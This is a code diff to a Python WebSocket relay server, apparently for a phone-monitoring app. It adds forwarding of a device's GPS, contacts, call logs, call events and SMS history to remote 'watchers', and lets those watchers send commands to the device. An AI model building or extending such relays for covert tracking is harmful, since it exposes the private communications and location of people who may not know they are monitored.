@@ -151,17 +151,24 @@ async def handle(request):
                                     dead.add(w)
                         watchers.get(code, set()).difference_update(dead)
 
-                    elif txt.startswith("GPS|") or txt == "GET_INFO":
-                        listener = listeners.get(code)
-                        if listener and not listener.closed:
-                            await safe_send_str(listener, txt)
-                        for w in list(watchers.get(code, set())):
-                            if not w.closed:
-                                await safe_send_str(w, txt)
                     else:
+                        # GPS|, GET_INFO, CONTACTS|, CALL_LOG|, CALL_EVENT|,
+                        # SMS_HISTORY| y cualquier otro mensaje del emisor
+                        # → va al listener (JOIN) Y a todos los watchers.
                         listener = listeners.get(code)
                         if listener and not listener.closed:
-                            await safe_send_str(listener, txt)
+                            ok = await safe_send_str(listener, txt)
+                            if not ok:
+                                listeners.pop(code, None)
+                        dead = set()
+                        for w in list(watchers.get(code, set())):
+                            if w.closed:
+                                dead.add(w)
+                            else:
+                                ok = await safe_send_str(w, txt)
+                                if not ok:
+                                    dead.add(w)
+                        watchers.get(code, set()).difference_update(dead)
 
                 elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                     break
@@ -226,7 +233,13 @@ async def handle(request):
                 await safe_send_str(emitter, "GET_INFO")
 
             async for msg in ws:
-                if msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
+                if msg.type == aiohttp.WSMsgType.TEXT:
+                    # Comandos del watcher → reenviar al emisor
+                    # (GET_CONTACTS, GET_CALL_LOG, GET_SMS, etc.)
+                    emitter = emitters.get(code)
+                    if emitter and not emitter.closed:
+                        await safe_send_str(emitter, msg.data)
+                elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                     break
 
         else:
